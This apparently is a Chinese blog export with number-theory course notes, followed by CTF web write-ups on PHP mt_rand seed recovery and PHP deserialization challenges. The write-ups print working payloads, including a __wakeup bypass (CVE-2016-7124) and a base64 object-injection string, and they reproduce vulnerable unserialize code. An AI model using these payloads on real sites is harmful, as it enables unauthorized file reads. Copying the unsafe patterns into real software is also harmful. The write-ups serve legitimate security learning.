<h3 id="求满足方程E：y-2-x-3-3x-1-mod-7-的所有点"><a href="#求满足方程E：y-2-x-3-3x-1-mod-7-的所有点" class="headerlink" title="求满足方程E：y^2 = x^3 - 3x + 1 (mod 7)的所有点"></a>求满足方程E：y^2 = x^3 - 3x + 1 (mod 7)的所有点</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">对x = 0,1,2,3,4,5,6分别求出y</span><br><span class="line">x=0             y^2≡1 (mod 7)               y≡1,6 (mod 7)</span><br><span class="line">x=1             y^2≡6 (mod 7)               无解</span><br><span class="line">x=2             y^2≡3 (mod 7)               无解</span><br><span class="line">x=3             y^2≡5 (mod 7)               无解</span><br><span class="line">x=4             y^2≡4 (mod 7)               y≡2,5 (mod 7)</span><br><span class="line">x=5             y^2≡6 (mod 7)               无解</span><br><span class="line">x=6             y^2≡5 (mod 7)               无解</span><br><span class="line">满足方程的点为(0,1),(0,6),(4,2),(4,5),共4个点</span><br></pre></td></tr></table></figure>
<h3 id="求解同余式x-2-≡-39-mod-105-中国剩余定理"><a href="#求解同余式x-2-≡-39-mod-105-中国剩余定理" class="headerlink" title="求解同余式x^2 ≡ 39 (mod 105) (中国剩余定理)"></a>求解同余式x^2 ≡ 39 (mod 105) (中国剩余定理)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">105=3*5*7</span><br><span class="line">化为方程组</span><br><span class="line">x^2 ≡ 0 (mod 3)             x = x1 ≡ 0 (mod 3)</span><br><span class="line">x^2 ≡ 4 (mod 5)     ==&gt;     x = x2 ≡ ±2 (mod 5)</span><br><span class="line">x^2 ≡ 4 (mod 7)             x = x3 ≡ ±2 (mod 7)</span><br><span class="line">b1=0        b2=±2       b3=±2</span><br><span class="line">m1=3        m2=5        m3=7</span><br><span class="line">M1=35       M2=21       M3=15</span><br><span class="line">M1<span class="string">'*M1 ≡ 1 (mod 3)          M1'</span>=2</span><br><span class="line">M2<span class="string">'*M2 ≡ 1 (mod 5)  ==&gt;     M2'</span>=1</span><br><span class="line">M3<span class="string">'*M3 ≡ 1 (MOD 7)          M3'</span>=1</span><br><span class="line">x=70*b1 + 21*b2 + 15*b3</span><br><span class="line">将b1,b2,b3带入</span><br><span class="line">x=70*0 + 21*2 + 15*2 ≡ 72 (mod 105)</span><br><span class="line">x=70*0 + 21*2 + 15*(-2) ≡ 12 (mod 105)</span><br><span class="line">x=70*0 + 21*(-2) + 15*2 = -12 ≡ 93 (mod 105)</span><br><span class="line">x=70*0 + 21*(-2) + 15*(-2) = -72 ≡ 33 (mod 105)</span><br></pre></td></tr></table></figure>
<h2 id="模重复平计算法-b-n-mod-m"><a href="#模重复平计算法-b-n-mod-m" class="headerlink" title="模重复平计算法 b^n (mod m)"></a>模重复平计算法 b^n (mod m)</h2><p>312^13 (mod 667)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">设m=667,b=312,令a=1</span><br><span class="line">将13写成二进制：13=2^0 + 2^2 + 2^3 (1101)</span><br><span class="line">n0=1    ---     a0=a*(b^n0)≡312 (mod 667)        ---     b1≡b^2≡629 (mod 667)</span><br><span class="line">n1=0    ---     a1=a0*(b1^n1)≡312 (mod 667)         ---     b2≡b1^2≡110 (mod 667)</span><br><span class="line">n2=1    ---     a2=a1*(b2^n2)≡303 (mod 667)      ---     b3≡b2^2≡94 (mod 667)</span><br><span class="line">n3=1    ---     a3=a2*(b3^n3)≡468 (mod 667)      </span><br><span class="line">计算出312^13 ≡ 468 (mod 667)</span><br><span class="line">写成表格为</span><br><span class="line">i       ni      ai      bi</span><br><span class="line">0       1       312     312</span><br><span class="line">1       0       312     629</span><br><span class="line">2       1       303     110</span><br><span class="line">3       1       468     94</span><br></pre></td></tr></table></figure>
<h2 id="欧拉判别条件"><a href="#欧拉判别条件" class="headerlink" title="欧拉判别条件"></a>欧拉判别条件</h2><p>x^2 ≡ a (mod p)<br>设p是奇素数，(a,p)=1<br>a是p的平方剩余充要条件：a^((p-1)/2) ≡ 1 (mod p)<br>a是p的平方非剩余充要条件：a^((p-1)/2) ≡ -1 (mod p)<br>当a时p的平方剩余时，该同余式恰有二解</p>
<h3 id="判断137是否为模227平方剩余"><a href="#判断137是否为模227平方剩余" class="headerlink" title="判断137是否为模227平方剩余"></a>判断137是否为模227平方剩余</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">227是奇素数，且(137,227)=1</span><br><span class="line">根据欧拉判别条件,只需计算137^((227-1)/2) (mod 227)，即137^113 (mod 227)</span><br><span class="line">运用模重复平方计算法，设m=227,b=137,a=1</span><br><span class="line">将113化为二进制：113=2^0 + 2^4 + 2^5 + 2^6  (1110001)</span><br><span class="line">n0=1    ---     a0=a*(b^n0)≡137 (mod 227)       ---     b1=b^2≡155 (mod 227)</span><br><span class="line">n1=0    ---     a1=a0*(b1^n1)≡137 (mod 227)     ---     b2=b1^2≡190 (mod 227)</span><br><span class="line">n2=0    ---     a2=a1*(b2^n2)≡137 (mod 227)     ---     b3=b2^2≡7 (mod 227)</span><br><span class="line">n3=0    ---     a3=a2*(b3^n3)≡137 (mod 227)     ---     b4=b3^2≡49 (mod 227)</span><br><span class="line">n4=1    ---     a4=a3*(b4^n4)≡130 (mod 227)     ---     b5=b4^2≡131 (mod 227)</span><br><span class="line">n5=1    ---     a5=a4*(b5^n5)≡5 (mod 227)       ---     b6=b5^2≡136 (mod 227)</span><br><span class="line">n6=1    ---     a6=a5*(b6^n6)≡226 (mod 227)≡-1 (mod 227)</span><br><span class="line">所以137是227的平方非剩余</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">设p是奇素数，(a1,p)=1,(a2,p)=1</span><br><span class="line">如果a1,a2都是模p的平方剩余，则a1*a2是模p的平方剩余</span><br><span class="line">如果a1,a2都是模p的平方非剩余，则a1*a2是模p的平方剩余</span><br><span class="line">如果a1是模p的平方剩余，a2是模p的平方非剩余，则a1*a2是模p的平方非剩余</span><br></pre></td></tr></table></figure>
<h2 id="模为奇素数的平方剩余与平方非剩余-判断是否有解"><a href="#模为奇素数的平方剩余与平方非剩余-判断是否有解" class="headerlink" title="模为奇素数的平方剩余与平方非剩余(判断是否有解)"></a>模为奇素数的平方剩余与平方非剩余(判断是否有解)</h2><p>p为奇素数，x^2 ≡ a (mod p),(a,p)=1</p>
<h3 id="欧拉判别条件-1"><a href="#欧拉判别条件-1" class="headerlink" title="欧拉判别条件"></a>欧拉判别条件</h3><p>若a^((p-1)/2) ≡ 1 (mod p),则a是模p的平方剩余<br>若a^((p-1)/2) ≡ -1 (mod p),则a是模p的平方非剩余</p>
<h3 id="勒让得符号"><a href="#勒让得符号" class="headerlink" title="勒让得符号"></a>勒让得符号</h3><p>(a/p)=1     —-        a是模p的平方剩余<br>(a/p)=-1    —-        a是模p的平方非剩余<br>(a/p)=0     —-        p|a<br>勒让得符号的性质<br>((a+p)/p)=(a/p)<br>(ab/p)=(a/p)(b/p)<br>若(a,p)=1,则(a^2/p)=1<br>若a ≡ b (mod p),则(a/p)=(b/p)<br>(-1/p)=1    —-        若p ≡ 1 (mod 4)<br>(-1/p)=-1   —-        若p ≡ 3 (mod 4)<br>高斯引理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(a/p)=(-1)^m,其中m是a*1,a*2,...,a*((p-1)/2)中模p的最小正剩余大于p/2的个数</span><br></pre></td></tr></table></figure>
<p>(2/p)=(-1)^((p^2-1)/8) = 1      若p ≡ ±1 (mod 8)<br>(2/p)=(-1)^((p^2-1)/8) = -1     若p ≡ ±3 (mod 8)</p>
<p>求x^2 ≡ -2 (mod 67)解的个数<br>(-2/67)=(-1/67)(2/67)<br>其中 (-1/67)=-1,(2/67)=-1<br>所以(-2/67)=1<br>同余式有二解</p>
<h3 id="二次互反律"><a href="#二次互反律" class="headerlink" title="二次互反律"></a>二次互反律</h3><p>若p,q都是互素奇素数，则(q/p)=<a href="p/q">(-1)^((p-1)/2)((q-1)/2</a></p>
<p>求x^2 ≡ 7 (mod 227)解的个数<br>(7/227)=<a href="227/2">(-1)^((227-1)/2)((7-1)/2)</a>=(5/7)=<a href="7/5">(-1)^((7-1)/2)((5-1)/2)</a>=(2/5)=-1<br>无解</p>
<h3 id="模p平方根"><a href="#模p平方根" class="headerlink" title="模p平方根"></a>模p平方根</h3><p>若p是形为4k+3的素数，如果同余式x^2 ≡ a (mod p)有解，则解为x= ±a^((p+1)/4) (mod p)</p>
<h3 id="模m平方根"><a href="#模m平方根" class="headerlink" title="模m平方根"></a>模m平方根</h3><p>m为合数，x^2 ≡ a (mod m),(a,m)=1</p>
<p>x^2 ≡ a (mod 2^α),(a,2)=1,α&gt;0<br>设α&gt;1,则同余式有解的必要条件是<br>1&gt;当α=2时，a ≡ 1 (mod 4)<br>2&gt;当α≥3时，a ≡ 1 (mod 8)<br>若1&gt;或2&gt;成立则有解，当α=2时，有2解，当α≥3时，有4解</p>
<h3 id="x-2-y-2-p"><a href="#x-2-y-2-p" class="headerlink" title="x^2 + y^2 =p"></a>x^2 + y^2 =p</h3><p>设p是素数，则x^2 + y^2 =p有解的充分必要条件是 p=2 或 -1为模p的平方剩余，即p=2 或 p=4k+1</p>
<h2 id="指数"><a href="#指数" class="headerlink" title="指数"></a>指数</h2>]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
  </entry>
  <entry>
    <title>php伪随机数</title>
    <url>/2020/05/08/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(100);</span><br><span class="line"><span class="built_in">echo</span> mt_rand().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">mt_srand(100);</span><br><span class="line"><span class="built_in">echo</span> mt_rand().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>上述代码中产生随机数的种子为100，两段同样的代码，输出如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/php_mt_rand3.jpg" alt=""><br>很明显两次输出的结果是一样的，这就出现了问题，意味着可以通过结果去算出种子<br>这里要用到工具php_mt_seed，使用这个工具利用种子产生的第一个伪随机数可以还原出原始的种子<br>注意：这里选取的伪随机数必须是第一个</p>
<h3 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/fakerandom.jpg" alt=""><br>查看源码，发现check.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'seed'</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'seed'</span>]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">'seed'</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="variable">$len1</span>=20;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(0, strlen(<span class="variable">$str_long1</span>) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, 0, 10);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.<span class="variable">$str_show</span>.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'num'</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>
<p>php伪随机数问题，使用php_mt_seed可以拿到种子<br>在此之前需要将数据转换为php_mt_seed可以处理的格式<br>处理脚本如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'vqrv81C218'</span>   <span class="comment">#这就是题目中给出的前半部分字符串</span></span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)-1)+<span class="string">' '</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>处理后的数据为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21 21 0 61 16 16 0 61 17 17 0 61 21 21 0 61 34 34 0 61 27 27 0 61 38 38 0 61 28 28 0 61 27 27 0 61 34 34 0 61</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/php_mt_rand2.jpg" alt=""><br>结果是在PHP7.1。0+环境下的种子是992958350，用该种子就可还原出字符串了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(992958350);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="variable">$len1</span>=20;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(0, strlen(<span class="variable">$str_long1</span>) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>还原出来的字符串为：vqrv81C218G0BdBZrC2V<br>提交即可拿到flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/php_mt_rand1.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>serialize():将一个对象转换成一个字符串<br>unserialize():将字符串还原成一个对象</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class A</span><br><span class="line">	&#123;</span><br><span class="line">		public <span class="variable">$name</span>=<span class="string">"w1ndy"</span>;</span><br><span class="line">		private <span class="variable">$hobby</span>=<span class="string">"basketball"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=new A();</span><br><span class="line">	<span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>结果为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">O:1:<span class="string">"A"</span>:2:&#123;s:4:<span class="string">"name"</span>;s:5:<span class="string">"w1ndy"</span>;s:8:<span class="string">"Ahobby"</span>;s:10:<span class="string">"basketball"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>第一个O表示Object，也就是对象，对象名字长度为1，对象名为A,该对象有两个属性(name和hobby)。<br>第一个属性是string类型，属性名长度为4，属性名为name,接着的w1ndy是属性name的值，长度为5.    (public)<br>第二个属性hobby与第一个类似，但是最大的区别就在于属性序列化后的名字是(类名+属性名)，且长度=(属性名长度+2),多加的这两个字符是%00,并不会显示出来，也可以写成这样:%00A%00hobby          (private)<br>在传入序列化字符串进行反序列化时要注意补齐两个空字节<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/unserialize/unserialize_0.PNG" alt=""></p>
<h3 id="极客大挑战-2019-PHP-wakeup-函数绕过"><a href="#极客大挑战-2019-PHP-wakeup-函数绕过" class="headerlink" title="[极客大挑战 2019]PHP(__wakeup()函数绕过)"></a>[极客大挑战 2019]PHP(__wakeup()函数绕过)</h3><p>页面提示网站备份，测试index.php.bak没找到，扫下目录，发现<a href="http://www.zip,下载下来后" target="_blank" rel="noopener">www.zip,下载下来后</a><br>在index.php中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include <span class="string">'class.php'</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">'select'</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
<p>在class.php中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private <span class="variable">$username</span> = <span class="string">'nonono'</span>;</span><br><span class="line">    private <span class="variable">$password</span> = <span class="string">'yesyes'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$username</span>,<span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;password != 100) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;username;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;password;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            global <span class="variable">$flag</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>要想拿到flag，必须满足:username=admin&amp;password=100<br>这里password很容易满足，但是username不然，传入的字符串进行反序列化时会触发<strong>wakeup()函数，username的值会被代替为”guest”，从而无法满足条件<br>绕过方法：当反序列化字符串中表示的属性个数大于真实属性个数时，会跳过 __wakeup 函数的执行<br>在这里就是利用这一点<br>构造payload：?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}<br>这里本来Name类有两个属性，为了跳过</strong>wakeup()函数，修改属性个数(要大于本来的个数)为3，成功拿到flag<br><a href="http://vulhub.org.cn/vuln/VH-CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a></p>
<h3 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="[攻防世界]Web_php_unserialize"></a>[攻防世界]Web_php_unserialize</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            //the secret is <span class="keyword">in</span> the fl4g.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, <span class="variable">$var</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        die(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>未绕过前：<br>``bash<br>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在序列化字符串中对象的长度处过滤了数字,用+4替换成4是可绕过这一点</span><br><span class="line">再利用__wakeup()函数的漏洞跳过__wakeup函数执行</span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">&lt;?php</span><br><span class="line">	class Demo</span><br><span class="line">	&#123;</span><br><span class="line">		private $file &#x3D; &#39;fl4g.php&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	$a&#x3D;new Demo();</span><br><span class="line">	$b &#x3D; serialize($a);</span><br><span class="line">	$b &#x3D; str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$b);</span><br><span class="line">    $b &#x3D; str_replace(&#39;:1:&#39;, &#39;:3:&#39;,$b);</span><br><span class="line">    echo (base64_encode($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>payload:?var=TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br>tip:这里有个坑，因为privite属性的值在序列化时名字中会有%00,序列化字符中并没有打印出来，不要手动绕过，否则很容易去掉隐藏的字符，导致payload错误</p>
<h3 id="安恒月赛-Ezunserialize"><a href="#安恒月赛-Ezunserialize" class="headerlink" title="[安恒月赛]Ezunserialize"></a>[安恒月赛]Ezunserialize</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> write(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> str_replace(chr(0) . <span class="string">'*'</span> . chr(0), <span class="string">'\0\0\0'</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">read</span>(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(0) . <span class="string">'*'</span> . chr(0), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$a</span>, <span class="variable">$b</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public <span class="variable">$b</span> = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">'a'</span>.<span class="variable">$this</span>-&gt;b;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        //flag.php</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new A(<span class="variable">$_GET</span>[<span class="string">'a'</span>],<span class="variable">$_GET</span>[<span class="string">'b'</span>]);</span><br><span class="line">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line"><span class="variable">$b</span> = unserialize(<span class="built_in">read</span>(write(serialize(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure>
<h3 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public <span class="variable">$correct</span> = <span class="string">""</span>;</span><br><span class="line">   public <span class="variable">$input</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;correct === <span class="variable">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="built_in">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'pleaseget'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'pleasepost'</span>] === <span class="string">'2'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">'md51'</span>]) == md5(<span class="variable">$_POST</span>[<span class="string">'md52'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'md51'</span>] != <span class="variable">$_POST</span>[<span class="string">'md52'</span>]) &#123;</span><br><span class="line">            unserialize(<span class="variable">$_POST</span>[<span class="string">'obj'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
